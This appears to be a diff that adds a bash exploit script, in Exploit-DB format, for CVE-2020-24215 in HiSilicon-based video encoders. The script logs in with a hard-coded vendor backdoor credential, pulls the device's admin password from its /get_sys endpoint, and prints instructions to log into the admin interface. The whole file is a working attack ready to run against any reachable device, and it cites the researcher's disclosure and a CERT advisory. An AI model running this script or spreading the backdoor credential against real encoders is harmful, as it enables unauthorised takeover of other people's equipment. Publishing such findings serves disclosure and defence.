@@ -1,0 +1,33 @@
+#!/usr/bin/env bash
+
+# Exploit Title: HiSilicon video encoders - full admin access via backdoor password
+# Date: 2020-09-20
+# Exploit Author: Alexei Kojenov
+# Vendor Homepage: multiple vendors
+# Software Link: N/A
+# Version: vendor-specific
+# Tested on: Linux
+# CVE: CVE-2020-24215
+# Vendors: URayTech, J-Tech Digital, ProVideoInstruments
+# Reference: https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/
+# Reference: https://www.kb.cert.org/vuls/id/896979
+
+
+if [ "$#" -ne 1 ]
+then
+  echo "Usage: $0 <server>[:<port>]"
+  exit 1
+fi
+
+printf "retrieving the password... "
+password=$(curl -s --user admin:neworange88888888 http://$1/get_sys | \
+           grep -oP '(?<=<html_password>).*?(?=</html_password>)')
+ret=$?
+           
+if [ "$ret" -eq 0 ]
+then
+  echo "the password is '$password'"
+  echo "navigate to http://$1 and log into the admin interface with user 'admin' and password '$password'"
+else
+  echo "ERROR: curl returned $ret"
+fi
